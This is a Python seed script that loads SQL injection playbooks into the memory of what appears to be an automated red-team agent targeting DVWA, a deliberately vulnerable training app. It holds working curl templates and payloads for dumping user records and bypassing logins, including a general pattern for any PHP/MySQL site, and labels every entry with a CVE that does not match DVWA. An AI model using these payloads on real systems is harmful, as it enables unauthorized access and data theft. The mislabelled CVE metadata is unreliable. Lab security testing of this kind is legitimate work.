"""
Seeds red_procedural with a validated DVWA SQL injection playbook.
Run once before executing the Red Team pipeline against DVWA.
"""

import uuid

from agents.shared.memory import RED_PROCEDURAL, get_collection

PLAYBOOKS = [
    {
        "id": str(uuid.uuid4()),
        "document": (
            "DVWA SQL injection database extraction: GET request to /vulnerabilities/sqli/ "
            "with authenticated session cookie. Append ?id=1'+OR+1%3D1--+&Submit=Submit to URL. "
            "Use curl with -b /tmp/dvwa_cookies.txt to send session cookie. "
            "No POST body needed — this is a GET request. "
            "Success indicators: 'First name', 'Surname', 'admin', 'Gordon'. "
            "DVWA security must be set to Low. User must be logged in first. "
            "This technique extracts all user records from the database."
        ),
        "metadata": {
            "playbook_id": "dvwa-sqli-db-extract-v1",
            "target_technology": "DVWA PHP MySQL",
            "cve_id": "CVE-2019-9053",
            "technique": "SQL injection database extraction via boolean-based OR in GET parameter",
            "tool": "curl",
            "args_template": (
                "-s -b /tmp/dvwa_cookies.txt -G "
                '--data-urlencode "id=1\' OR 1=1-- " '
                '--data-urlencode "Submit=Submit"'
            ),
            "target_endpoint": "/vulnerabilities/sqli/",
            "success_indicators": "First name,Surname,admin,Gordon,Brown",
            "failure_indicators": "Login failed,Unauthorized,403,404",
            "notes": (
                "GET request to /vulnerabilities/sqli/ with id parameter. "
                "Requires authenticated session — use -b /tmp/dvwa_cookies.txt. "
                "Security level must be low (set via /security.php). "
                "Response contains all user records when injection succeeds."
            ),
            "outcome": "SUCCESS",
        },
    },
    {
        "id": str(uuid.uuid4()),
        "document": (
            "DVWA SQL injection login bypass: POST to /login.php with session cookie. "
            "Use curl with -c and -b flags pointing to a real cookie file so the session "
            "persists across redirects. Payload: username=' OR 1=1-- &password=x&Login=Login. "
            "Success indicators: 'Welcome', 'Damn Vulnerable', 'logout', 'index.php'. "
            "DVWA security must be set to Low via the setup page first."
        ),
        "metadata": {
            "playbook_id": "dvwa-sqli-login-v1",
            "target_technology": "DVWA PHP MySQL",
            "cve_id": "CVE-2019-9053",
            "technique": "SQL injection login bypass via boolean-based OR condition",
            "tool": "curl",
            "args_template": (
                "-s -X POST "
                "-c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt "
                "-d 'username=%27+OR+1%3D1--+&password=x&Login=Login' "
                "-L"
            ),
            "target_endpoint": "/login.php",
            "success_indicators": "Welcome,Damn Vulnerable,logout,index.php",
            "failure_indicators": "Login failed,Invalid,incorrect",
            "notes": (
                "DVWA login.php uses mysqli_real_escape_string so this bypass may fail. "
                "Prefer dvwa-sqli-db-extract-v1 which targets /vulnerabilities/sqli/ instead. "
                "-c /dev/null discards session and breaks redirect. "
                "URL-encode the payload in -d flag."
            ),
            "outcome": "FAILURE",
        },
    },
    {
        "id": str(uuid.uuid4()),
        "document": (
            "DVWA setup: before running SQL injection, ensure DVWA security level is Low. "
            "First login: GET /login.php to get CSRF token, then POST with admin/password + user_token. "
            "Then POST to /security.php: security=low&seclev_submit=Submit&user_token=<token>. "
            "DVWA cookies are at /tmp/dvwa_cookies.txt — use -b and -c flags. "
            "Database must be initialized (tables: users, guestbook) before any attacks."
        ),
        "metadata": {
            "playbook_id": "dvwa-setup-v1",
            "target_technology": "DVWA PHP MySQL",
            "cve_id": "CVE-2019-9053",
            "technique": "DVWA pre-exploit setup — set security to Low",
            "tool": "curl",
            "args_template": (
                "-s -X POST "
                "-c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt "
                "-d 'security=low&seclev_submit=Submit' "
                "-L"
            ),
            "target_endpoint": "/security.php",
            "success_indicators": "Security Level set to low",
            "failure_indicators": "error,denied",
            "notes": "Must be logged in first. Run dvwa-sqli-login-v1 playbook before this.",
            "outcome": "SUCCESS",
        },
    },
    {
        "id": str(uuid.uuid4()),
        "document": (
            "General SQL injection login bypass pattern for PHP/MySQL web apps. "
            "Technique: boolean-based OR injection in username field. "
            "Payload variants: ' OR 1=1-- , ' OR '1'='1'-- , admin'-- . "
            "Always maintain session cookies across requests. "
            "Check response for admin panel indicators, welcome messages, or dashboard content."
        ),
        "metadata": {
            "playbook_id": "sqli-login-bypass-general-v1",
            "target_technology": "PHP MySQL",
            "cve_id": "CVE-2019-9053",
            "technique": "SQL injection login bypass boolean OR",
            "tool": "curl",
            "args_template": (
                "-s -X POST "
                "-c /tmp/cookies.txt -b /tmp/cookies.txt "
                "-d 'username=%27+OR+1%3D1--+&password=x' "
                "-L"
            ),
            "target_endpoint": "/login.php",
            "success_indicators": "Welcome,admin,dashboard,logout,index",
            "failure_indicators": "Login failed,Invalid,incorrect,denied",
            "notes": "Cookie file path must be writable. -c /dev/null breaks session.",
            "outcome": "SUCCESS",
        },
    },
]


def main():
    collection = get_collection(RED_PROCEDURAL)
    print(f"[seed] red_procedural currently has {collection.count()} docs")

    added = 0
    for pb in PLAYBOOKS:
        if pb["metadata"]["playbook_id"] in {
            m.get("playbook_id") for m in collection.get()["metadatas"]
        }:
            print(f"[seed] Skipping existing playbook: {pb['metadata']['playbook_id']}")
            continue

        collection.add(
            documents=[pb["document"]],
            metadatas=[pb["metadata"]],
            ids=[pb["id"]],
        )
        print(f"[seed] Added playbook: {pb['metadata']['playbook_id']}")
        added += 1

    print(f"[seed] Done. Added {added} playbooks. Total: {collection.count()} docs")


if __name__ == "__main__":
    main()
